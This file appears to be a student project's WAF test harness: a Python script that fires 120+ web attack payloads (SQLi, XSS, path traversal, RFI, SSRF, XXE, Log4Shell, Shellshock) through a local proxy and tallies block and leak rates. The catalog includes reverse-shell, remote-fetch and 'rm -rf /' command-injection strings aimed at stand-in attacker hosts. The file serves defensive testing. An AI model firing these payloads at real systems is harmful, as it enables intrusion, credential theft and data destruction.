"""LatentGuard red-team battery -- fires 120+ varied attacks through the proxy
and reports per-class block / leak rates.

Why this exists:
  Defending the WAF in viva requires demonstrating coverage breadth, not just
  the canonical "SQLi blocked" demo. This script exercises 15+ OWASP-class
  attack patterns with multiple variants each (encoded, blind, obfuscated,
  multi-vector) so the supervisor can see the system handle ambiguous payloads,
  not only textbook ones. Tests run through the proxy on 127.0.0.1:8080 by
  default -- localhost triggers a 10s Windows IPv6 fallback (CLAUDE.md #19).

Output:
  Per-attack line: [###] CLASS/name METHOD path -> HTTP code  verdict
  Verdict is BLOCK (403, expected), LEAK (non-403 when expected block), or
  TARGET-MISS (404/5xx from upstream not the WAF). LEAK is the only counter
  that should be near zero on a healthy fyp-II stack.
  Final per-class summary table.

Run:
  python attacks/run_attacks.py --proxy http://127.0.0.1:8080
  python attacks/run_attacks.py --proxy http://127.0.0.1:8080 --class sqli  # filter
  python attacks/run_attacks.py --verbose  # print response bodies on LEAK
"""
from __future__ import annotations

import argparse
import http.client
import json
import sys
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse


@dataclass
class Attack:
    cls: str          # attack class (sqli, xss, traversal, ...)
    name: str         # short identifier within class
    method: str       # GET, POST, PUT, DELETE, ...
    path: str         # request path (already URL-encoded as needed)
    body: Optional[str] = None
    content_type: str = "application/x-www-form-urlencoded"
    headers: dict = field(default_factory=dict)
    expect_block: bool = True


# --------------------------------------------------------------------------- #
# Attack catalog -- 120+ payloads, grouped by class.
# Endpoint targets are split between Juice Shop API surface and the generic
# proxy root so we test both content-rich and minimal-surface attack flows.
# --------------------------------------------------------------------------- #

ATTACKS: list[Attack] = []

# ---------- SQL Injection (20) ----------
SQLi_PAYLOADS_QUERY = [
    ("classic-or",         "/?q=%27%20OR%201=1--"),
    ("classic-or-double",  "/?q=%22%20OR%20%221%22=%221"),
    ("union-select",       "/?q=%27%20UNION%20SELECT%20null,null,null--"),
    ("union-version",      "/?q=%27%20UNION%20SELECT%20@@version,null--"),
    ("stacked-drop",       "/?q=1%27;DROP%20TABLE%20users--"),
    ("comment-mysql",      "/?q=admin%27%23"),
    ("comment-hash",       "/?id=1%20%23%20comment"),
    ("info-schema",        "/?id=1%27%20AND%20SELECT%20*%20FROM%20information_schema.tables--"),
    ("blind-and-1-1",      "/?id=1%20AND%201=1"),
    ("blind-and-1-2",      "/?id=1%20AND%201=2"),
    ("time-based-mysql",   "/?id=1%27%20OR%20SLEEP(5)--"),
    ("time-based-pg",      "/?id=1%27;SELECT%20pg_sleep(5)--"),
    ("union-load-file",    "/?q=%27%20UNION%20SELECT%20LOAD_FILE(%27/etc/passwd%27)--"),
    ("hex-encoded",        "/?q=0x27%20OR%20%271%27=%271"),
    ("juice-search-or",    "/rest/products/search?q=%27)%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--"),
    ("juice-search-tick",  "/rest/products/search?q=apple%27"),
    ("juice-search-true",  "/rest/products/search?q=qwert%27))%20OR%20((1=1"),
    ("admin-bypass-or",    "/?username=admin%27%20OR%201=1--"),
    ("nested-subquery",    "/?id=1%20OR%20EXISTS(SELECT%20*%20FROM%20users)"),
    ("waitfor-mssql",      "/?id=1%27;WAITFOR%20DELAY%20%2700:00:05%27--"),
]
for name, path in SQLi_PAYLOADS_QUERY:
    ATTACKS.append(Attack("sqli", name, "GET", path))

# SQLi in JSON body (Juice Shop login)
ATTACKS.append(Attack("sqli", "json-login-or", "POST", "/rest/user/login",
    body=json.dumps({"email": "admin@juice-sh.op' OR 1=1--", "password": "x"}),
    content_type="application/json"))
ATTACKS.append(Attack("sqli", "json-login-comment", "POST", "/rest/user/login",
    body=json.dumps({"email": "admin@juice-sh.op'--", "password": "x"}),
    content_type="application/json"))

# ---------- XSS (18) ----------
XSS_PAYLOADS = [
    ("script-tag",        "/?q=<script>alert(1)</script>"),
    ("script-no-paren",   "/?q=<script>alert%601%60</script>"),
    ("img-onerror",       "/?q=<img%20src=x%20onerror=alert(1)>"),
    ("svg-onload",        "/?q=<svg/onload=alert(1)>"),
    ("body-onload",       "/?q=<body%20onload=alert(1)>"),
    ("input-onfocus",     "/?q=<input%20autofocus%20onfocus=alert(1)>"),
    ("iframe-srcdoc",     "/?q=<iframe%20srcdoc=%22<script>alert(1)</script>%22>"),
    ("javascript-uri",    "/?url=javascript:alert(1)"),
    ("javascript-uri-2",  "/?next=javascript:alert(document.cookie)"),
    ("data-uri",          "/?u=data:text/html,<script>alert(1)</script>"),
    ("onclick-handler",   "/?q=<a%20href=%23%20onclick=%22alert(1)%22>x</a>"),
    ("onerror-img-encoded","/?q=%3Cimg%20src=x%20onerror=alert(1)%3E"),
    ("script-uppercase",  "/?q=<SCRIPT>ALERT(1)</SCRIPT>"),
    ("script-mixed-case", "/?q=<ScRiPt>alert(1)</ScRiPt>"),
    ("html-entity-bypass","/?q=&lt;script&gt;alert(1)&lt;/script&gt;", False),  # entity-encoded -> harmless, expect pass
    ("polyglot",          "/?q=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/*%20*/oNcliCk=alert()%20)//"),
    ("dom-write",         "/?q=<script>document.write(1)</script>"),
    ("base64-eval",       "/?q=<script>eval(atob('YWxlcnQoMSk='))</script>"),
]
for entry in XSS_PAYLOADS:
    name, path = entry[0], entry[1]
    expect = entry[2] if len(entry) > 2 else True
    ATTACKS.append(Attack("xss", name, "GET", path, expect_block=expect))

# XSS in POST body
ATTACKS.append(Attack("xss", "json-feedback-script", "POST", "/api/Feedbacks/",
    body=json.dumps({"comment": "<script>alert(1)</script>", "rating": 5,
                     "captchaId": 0, "captcha": "0"}),
    content_type="application/json"))

# ---------- Path Traversal / LFI (14) ----------
TRAV_PAYLOADS = [
    ("etc-passwd",         "/?file=../../../etc/passwd"),
    ("etc-shadow",         "/?file=../../../etc/shadow"),
    ("etc-hosts",          "/?file=../../../etc/hosts"),
    ("win-system32",       "/?file=..\\..\\..\\windows\\system32\\config\\sam"),
    ("encoded-dotdot",     "/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    ("double-encoded",     "/?file=%252e%252e%252fetc%252fpasswd"),
    ("dotdot-slash-many",  "/?file=../../../../../../../etc/passwd"),
    ("absolute-passwd",    "/?file=/etc/passwd"),
    ("null-byte",          "/?file=../../../etc/passwd%00.jpg"),
    ("ftp-traversal",      "/ftp/../../../etc/passwd"),
    ("ftp-package-json",   "/ftp/../package.json"),
    ("backslash-trav",     "/?file=..\\\\..\\\\etc\\\\passwd"),
    ("utf8-overlong",      "/?file=%c0%ae%c0%ae%2fetc%2fpasswd"),
    ("etc-passwd-postbody", "/?q=normal", None),  # placeholder
]
for entry in TRAV_PAYLOADS[:-1]:
    name, path = entry[0], entry[1]
    ATTACKS.append(Attack("traversal", name, "GET", path))
# LFI / wrapper schemes
LFI_PAYLOADS = [
    ("php-filter",     "/?file=php://filter/convert.base64-encode/resource=index.php"),
    ("php-input",      "/?file=php://input"),
    ("data-wrapper",   "/?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="),
    ("expect-wrapper", "/?file=expect://id"),
]
for name, path in LFI_PAYLOADS:
    ATTACKS.append(Attack("lfi", name, "GET", path))

# ---------- RFI (4) ----------
RFI_PAYLOADS = [
    ("http-include",   "/?page=http://evil.example.com/shell.php"),
    ("https-include",  "/?page=https://attacker.test/payload.txt"),
    ("ftp-include",    "/?page=ftp://evil.example.com/x.txt"),
    ("smb-include",    "/?page=\\\\attacker\\share\\shell"),
]
for name, path in RFI_PAYLOADS:
    ATTACKS.append(Attack("rfi", name, "GET", path))

# ---------- Command Injection / RCE (14) ----------
CMD_PAYLOADS = [
    ("semicolon-cat",     "/?cmd=;cat%20/etc/passwd"),
    ("pipe-id",           "/?cmd=|id"),
    ("amp-whoami",        "/?cmd=&&whoami"),
    ("backtick",          "/?cmd=`id`"),
    ("dollar-paren",      "/?cmd=$(id)"),
    ("newline-injection", "/?cmd=%0aid"),
    ("wget-payload",      "/?cmd=;wget%20http://evil/sh.sh"),
    ("curl-payload",      "/?cmd=;curl%20attacker.test/x"),
    ("nc-reverse",        "/?cmd=;nc%20-e%20/bin/sh%20attacker.test%204444"),
    ("base64-decode",     "/?cmd=;echo%20Y2F0IC9ldGMvcGFzc3dk|base64%20-d|sh"),
    ("rm-rf",             "/?cmd=;rm%20-rf%20/"),
    ("uname",             "/?cmd=;uname%20-a"),
    ("php-passthru",      "/?cmd=<?php%20passthru($_GET[c]);%20?>"),
    ("python-eval",       "/?cmd=__import__('os').system('id')"),
]
for name, path in CMD_PAYLOADS:
    ATTACKS.append(Attack("rce", name, "GET", path))

# ---------- SSRF (8) ----------
SSRF_PAYLOADS = [
    ("aws-metadata",     "/?url=http://169.254.169.254/latest/meta-data/"),
    ("aws-iam",          "/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("gcp-metadata",     "/?url=http://metadata.google.internal/computeMetadata/v1/"),
    ("localhost-22",     "/?url=http://127.0.0.1:22"),
    ("localhost-mongo",  "/?url=http://127.0.0.1:27017"),
    ("file-protocol",    "/?url=file:///etc/passwd"),
    ("gopher-redis",     "/?url=gopher://127.0.0.1:6379/_FLUSHALL"),
    ("dict-redis",       "/?url=dict://127.0.0.1:6379/INFO"),
]
for name, path in SSRF_PAYLOADS:
    ATTACKS.append(Attack("ssrf", name, "GET", path))

# ---------- NoSQL Injection (6) ----------
NOSQL_PAYLOADS = [
    ("ne-bypass",     {"email": {"$ne": None}, "password": {"$ne": None}}),
    ("gt-bypass",     {"email": "admin@juice-sh.op", "password": {"$gt": ""}}),
    ("regex-bypass",  {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}}),
    ("where-injection", {"email": "admin", "password": "x", "$where": "1==1"}),
    ("in-array",      {"email": {"$in": ["admin@juice-sh.op"]}, "password": "x"}),
    ("exists",        {"email": {"$exists": True}, "password": {"$exists": True}}),
]
for name, body in NOSQL_PAYLOADS:
    ATTACKS.append(Attack("nosqli", name, "POST", "/rest/user/login",
                          body=json.dumps(body), content_type="application/json"))

# ---------- Scanner User-Agents (10) ----------
SCANNER_UAS = [
    "sqlmap/1.6.7",
    "Nikto/2.1.6",
    "Nmap Scripting Engine; https://nmap.org",
    "w3af.org",
    "Acunetix-Aspect",
    "Mozilla/5.0 (compatible; Burp Collaborator Client)",
    "WPScan v3.8.22",
    "Mozilla/5.0 (compatible; Nessus)",
    "masscan/1.3",
    "ZAP/2.11.1",
]
for ua in SCANNER_UAS:
    short = ua.split("/")[0].split(" ")[0].lower().replace(".", "")
    ATTACKS.append(Attack("scanner-ua", short, "GET", "/",
                          headers={"User-Agent": ua}))

# ---------- Header Injection / CRLF / Host (6) ----------
ATTACKS.append(Attack("header-inj", "crlf-set-cookie", "GET", "/",
    headers={"X-Forwarded-For": "1.1.1.1\r\nSet-Cookie: pwn=1"}))
ATTACKS.append(Attack("header-inj", "host-evil", "GET", "/",
    headers={"Host": "evil.attacker.test"}, expect_block=False))
# ^ Host injection often passes content filters -- left as expect_block=False
ATTACKS.append(Attack("header-inj", "xff-sqli", "GET", "/",
    headers={"X-Forwarded-For": "1.1.1.1' OR 1=1--"}))
ATTACKS.append(Attack("header-inj", "referer-xss", "GET", "/",
    headers={"Referer": "http://x/<script>alert(1)</script>"}))
ATTACKS.append(Attack("header-inj", "ua-sqli", "GET", "/",
    headers={"User-Agent": "Mozilla/5.0 ' OR 1=1--"}))
ATTACKS.append(Attack("header-inj", "cookie-sqli", "GET", "/",
    headers={"Cookie": "session=' UNION SELECT 1,2,3--"}))

# ---------- XXE (3) ----------
XXE_BODY = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""
ATTACKS.append(Attack("xxe", "etc-passwd", "POST", "/rest/user/login",
    body=XXE_BODY, content_type="application/xml"))
ATTACKS.append(Attack("xxe", "parameter-entity", "POST", "/api/Feedbacks/",
    body="""<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/x.dtd">%p;]>
<r/>""", content_type="application/xml"))
ATTACKS.append(Attack("xxe", "billion-laughs", "POST", "/api/Feedbacks/",
    body="""<?xml version="1.0"?>
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]>
<lolz>&lol2;</lolz>""", content_type="application/xml"))

# ---------- SSTI (5) ----------
SSTI_PAYLOADS = [
    ("jinja-7x7",        "/?name={{7*7}}"),
    ("jinja-config",     "/?name={{config.items()}}"),
    ("twig-7x7",         "/?name={{7*7}}"),
    ("dollar-expr",      "/?name=${{7*7}}"),
    ("erb-rce",          "/?name=<%25%3D7*7%25>"),
]
for name, path in SSTI_PAYLOADS:
    ATTACKS.append(Attack("ssti", name, "GET", path))

# ---------- LDAP Injection (4) ----------
LDAP_PAYLOADS = [
    ("star-bypass",     "/?username=*)(uid=*))(|(uid=*"),
    ("admin-bypass",    "/?username=admin)(&)"),
    ("wildcard",        "/?username=*"),
    ("or-injection",    "/?username=*)(|(password=*))"),
]
for name, path in LDAP_PAYLOADS:
    ATTACKS.append(Attack("ldap", name, "GET", path))

# ---------- Open Redirect (4) ----------
REDIR_PAYLOADS = [
    ("absolute-evil",   "/?redirect=http://evil.attacker.test"),
    ("protocol-rel",    "/?redirect=//evil.attacker.test"),
    ("backslash",       "/?redirect=/\\evil.attacker.test"),
    ("at-sign",         "/?redirect=http://juice-sh.op@evil.attacker.test"),
]
for name, path in REDIR_PAYLOADS:
    ATTACKS.append(Attack("redirect", name, "GET", path, expect_block=False))
# ^ Open redirects often pass content filters; we still log them.

# ---------- Shellshock (3) ----------
SHELLSHOCK_UA = "() { :;}; echo vulnerable; /bin/cat /etc/passwd"
ATTACKS.append(Attack("shellshock", "ua-cgi",        "GET", "/cgi-bin/test",
    headers={"User-Agent": SHELLSHOCK_UA}))
ATTACKS.append(Attack("shellshock", "referer-cgi",   "GET", "/cgi-bin/test",
    headers={"Referer": SHELLSHOCK_UA}))
ATTACKS.append(Attack("shellshock", "cookie-cgi",    "GET", "/cgi-bin/test",
    headers={"Cookie": SHELLSHOCK_UA}))

# ---------- Log4Shell / JNDI (4) ----------
LOG4SHELL_PAYLOAD = "${jndi:ldap://attacker.test/x}"
ATTACKS.append(Attack("log4shell", "ua-jndi", "GET", "/",
    headers={"User-Agent": LOG4SHELL_PAYLOAD}))
ATTACKS.append(Attack("log4shell", "query-jndi", "GET", f"/?q=${{jndi:ldap://attacker.test/x}}"))
ATTACKS.append(Attack("log4shell", "header-xapi", "GET", "/",
    headers={"X-Api-Version": LOG4SHELL_PAYLOAD}))
ATTACKS.append(Attack("log4shell", "json-body", "POST", "/api/Feedbacks/",
    body=json.dumps({"comment": LOG4SHELL_PAYLOAD, "rating": 5,
                     "captchaId": 0, "captcha": "0"}),
    content_type="application/json"))

# ---------- Prototype Pollution (3) ----------
PROTO_PAYLOADS = [
    {"__proto__": {"admin": True}, "email": "x@x.test", "password": "x"},
    {"constructor": {"prototype": {"polluted": True}}, "email": "x@x.test", "password": "x"},
    {"email": "x@x.test", "password": "x", "isAdmin": True, "__proto__": {"role": "admin"}},
]
for i, body in enumerate(PROTO_PAYLOADS):
    ATTACKS.append(Attack("proto-poll", f"variant-{i+1}", "POST", "/rest/user/login",
                          body=json.dumps(body), content_type="application/json"))

# ---------- HTTP Method Abuse (4) ----------
ATTACKS.append(Attack("method-abuse", "trace",   "TRACE",   "/", expect_block=False))
ATTACKS.append(Attack("method-abuse", "track",   "TRACK",   "/", expect_block=False))
ATTACKS.append(Attack("method-abuse", "connect", "CONNECT", "/", expect_block=False))
ATTACKS.append(Attack("method-abuse", "options-attack", "OPTIONS",
    "/?q=%27%20OR%201=1--"))

# ---------- Sensitive File Probes (5) ----------
SENSITIVE_PATHS = [
    "/.env",
    "/.git/config",
    "/wp-admin/setup-config.php",
    "/phpmyadmin/index.php",
    "/admin/config.php",
]
for path in SENSITIVE_PATHS:
    short = path.strip("/").replace("/", "-").replace(".", "")[:25]
    ATTACKS.append(Attack("recon", short, "GET", path, expect_block=False))
# ^ Recon hits often pass content filter and 404 at app; we log to see if WAF
# catches scanner-style probes.

# --------------------------------------------------------------------------- #
# Runner
# --------------------------------------------------------------------------- #

UA_DEFAULT = "LatentGuard-RedTeam/1.0"
TIMEOUT = 10


def fire(proxy_url: str, atk: Attack, verbose: bool = False) -> tuple[int, float, str]:
    parsed = urlparse(proxy_url)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or 80
    host_hdr = f"{host}:{port}"
    # Force IPv4 to dodge Windows ::1 fallback (CLAUDE.md #19).
    if host == "localhost":
        host = "127.0.0.1"

    headers = {"User-Agent": UA_DEFAULT, "Accept": "*/*", "Connection": "close",
               "Host": host_hdr}
    headers.update(atk.headers)
    body = atk.body.encode() if atk.body is not None else None
    if body is not None:
        headers.setdefault("Content-Type", atk.content_type)
        headers["Content-Length"] = str(len(body))

    conn = http.client.HTTPConnection(host, port, timeout=TIMEOUT)
    t0 = time.perf_counter()
    try:
        conn.request(atk.method, atk.path, body=body, headers=headers)
        resp = conn.getresponse()
        text = resp.read().decode("utf-8", errors="replace")
        elapsed = (time.perf_counter() - t0) * 1000
        return resp.status, elapsed, text
    except Exception as exc:
        elapsed = (time.perf_counter() - t0) * 1000
        return 0, elapsed, f"ERROR: {exc}"
    finally:
        conn.close()


def verdict_label(status: int, expect_block: bool) -> str:
    if status == 403:
        return "BLOCK" if expect_block else "BLOCK*"  # WAF blocked even though expected pass -- noteworthy
    if status == 0:
        return "ERROR"
    if expect_block:
        if 400 <= status < 500 and status != 403:
            return "TGT-MISS"  # upstream said no, WAF didn't see it
        if status >= 500:
            return "5XX"
        return "LEAK"          # 2xx / 3xx on an attack we expected blocked
    return "PASS"              # non-block expected, non-block got


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--proxy", default="http://127.0.0.1:8080")
    p.add_argument("--class", dest="cls", default=None,
                   help="only run attacks of this class (e.g. sqli, xss)")
    p.add_argument("--verbose", action="store_true",
                   help="print response body on LEAK / ERROR")
    p.add_argument("--sleep-ms", type=int, default=20)
    args = p.parse_args()

    pool = [a for a in ATTACKS if args.cls is None or a.cls == args.cls]
    print(f"LatentGuard red-team battery: {len(pool)} attacks via {args.proxy}")
    print(f"  classes: {', '.join(sorted(set(a.cls for a in pool)))}")
    print("=" * 92)

    results = []  # (atk, status, elapsed, verdict)
    by_class: dict[str, dict[str, int]] = {}
    for i, atk in enumerate(pool, 1):
        status, elapsed, text = fire(args.proxy, atk, args.verbose)
        v = verdict_label(status, atk.expect_block)
        results.append((atk, status, elapsed, v, text))
        c = by_class.setdefault(atk.cls, {"total": 0, "BLOCK": 0, "LEAK": 0,
                                           "PASS": 0, "BLOCK*": 0, "ERROR": 0,
                                           "TGT-MISS": 0, "5XX": 0})
        c["total"] += 1
        c[v] = c.get(v, 0) + 1
        marker = "BLK" if v.startswith("BLOCK") else v
        print(f"[{i:03d}] {atk.cls:<13s} {atk.name:<24s} {atk.method:<6s} "
              f"{atk.path[:38]:<38s} -> {status:>3d}  {marker}  ({elapsed:>5.0f}ms)")
        if args.verbose and v in ("LEAK", "ERROR"):
            print(f"      body: {text[:180]!r}")
        time.sleep(args.sleep_ms / 1000.0)

    # ---------- Summary ----------
    print("\n" + "=" * 92)
    print("PER-CLASS SUMMARY")
    print("=" * 92)
    header = f"{'CLASS':<14s} {'TOTAL':>5s}  {'BLOCK':>5s}  {'LEAK':>4s}  {'PASS':>4s}  {'ERR':>3s}  {'OTHER':>5s}"
    print(header)
    print("-" * len(header))
    grand_total = grand_block = grand_leak = 0
    expected_block_total = sum(1 for a in pool if a.expect_block)
    for cls in sorted(by_class.keys()):
        c = by_class[cls]
        other = c["TGT-MISS"] + c["5XX"] + c["BLOCK*"]
        print(f"{cls:<14s} {c['total']:>5d}  {c['BLOCK']:>5d}  {c['LEAK']:>4d}  "
              f"{c['PASS']:>4d}  {c['ERROR']:>3d}  {other:>5d}")
        grand_total += c["total"]
        grand_block += c["BLOCK"]
        grand_leak += c["LEAK"]
    print("-" * len(header))
    detect_rate = (grand_block / expected_block_total * 100) if expected_block_total else 0.0
    print(f"GRAND          {grand_total:>5d}  {grand_block:>5d}  {grand_leak:>4d}")
    print(f"\nExpected-block attacks: {expected_block_total}; blocked: {grand_block} "
          f"=> WAF detection rate {detect_rate:.1f}%")
    if grand_leak:
        print(f"\nLEAKS (should be blocked but got through):")
        for atk, status, elapsed, v, _ in results:
            if v == "LEAK":
                print(f"  [{atk.cls}/{atk.name}]  {atk.method} {atk.path[:60]} -> {status}")
    return 0 if grand_leak == 0 else 2


if __name__ == "__main__":
    sys.exit(main())
